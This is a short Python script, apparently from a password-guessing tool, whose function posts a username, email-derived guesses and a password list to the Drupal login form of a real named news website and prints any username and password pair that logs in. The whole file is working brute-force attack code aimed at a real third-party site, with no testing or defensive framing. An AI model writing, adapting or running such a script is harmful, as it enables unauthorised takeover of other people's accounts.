import requests
import sys
import time
from space import *

def attempt(entry, passwords):
	try:
		for item in [entry[1], entry[2]] + passwords:
			data = {"form_id": "user_login", "name": entry[1], "pass": item}
			response = requests.post("http://zerohedge.com/user/", data).text
			if "/user/password" not in response:
				sys.stdout.write(str(entry[0]) + \
					space("number", len(str(entry[0]))) + entry[1] + \
					space("username", len(entry[1])) + item + "\n")
				sys.stdout.flush()
				exit()
	except Exception as error: time.sleep(1)
